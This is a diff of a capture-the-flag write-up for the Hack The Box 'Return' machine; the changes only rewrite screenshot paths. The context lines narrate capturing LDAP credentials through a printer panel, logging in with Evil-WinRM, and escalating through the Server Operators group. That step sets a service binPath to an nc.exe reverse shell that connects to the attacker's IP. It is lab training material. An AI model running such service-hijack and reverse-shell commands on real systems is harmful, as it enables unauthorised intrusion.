@@ -68,17 +68,17 @@ Host script results:
 
 Dead end at the moment, maybe we will come back when we find some credentials.
 
-![SMB](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-10-52.png)
+![SMB](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-10-52.png)
 
 ## Web - TCP 80
 
 The website is a 'HTB Printer Admin Panel'
-![Web](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-11-07.png)
+![Web](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-11-07.png)
 
 # Shell as svc-printer
 
 On the 'Settings' tab ther eis pre-filled form
-![Web2](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-11-18.png)
+![Web2](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-11-18.png)
 
 ## Burp 
 
@@ -94,8 +94,8 @@ User can only change the Server Address ('ip'), and not port, username or passwo
 
 If we change the ip to our tun0 IP and start listener on port 389 we should catch some response.
 
-![Request](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-11-42.png)
-![Request2](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-11-58.png)
+![Request](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-11-42.png)
+![Request2](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-11-58.png)
 
 ...and it’s trying to authenticate so we have username and password.
 
@@ -103,11 +103,11 @@ If we change the ip to our tun0 IP and start listener on port 389 we should catc
 
 Credentials happen to work for WinRM, so we can get a shell usin Evil-WinRM
 
-![WinRm_shell](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-25-07.png)
+![WinRm_shell](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-25-07.png)
 
 and get the user flag
 
-![WinRm_shell](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-31-22.png)
+![WinRm_shell](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-31-22.png)
 
 # Privilege Escalation
 
@@ -115,11 +115,11 @@ and get the user flag
 
 First of all, let's check our privileges,
 
-![priv](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-50-08.png)
+![priv](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-50-08.png)
 
 and also groups.
 
-![priv2](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-50-21.png)
+![priv2](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-50-21.png)
 
 A lot can be done with privileges like **SeLoadDriverPrivilege** or **SeBackupPrivilege** but the **Server Operators** group is quite a catch.
 
@@ -129,19 +129,19 @@ Server Operators can modify, start, and stop services, we can abuse this by havi
 
 Upload the nc.exe 
 
-![nc](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-52-04.png)
+![nc](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-52-04.png)
 
 Now modify a service binary path, stop and restart the service:
 
 ```shell-session
 sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.45 4444"
 ```
-![sh](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-58-25.png)
+![sh](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-58-25.png)
 
 Start listener and as soon as we start the service again we catch the shell.
 
-![sh2](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-58-54.png)
+![sh2](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-58-54.png)
 
-![sh2](/Content/Writeups/HTB-Return/img/Screenshot_2024-10-30_05-58-00.png)
+![sh2](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-58-00.png)
 
 ~
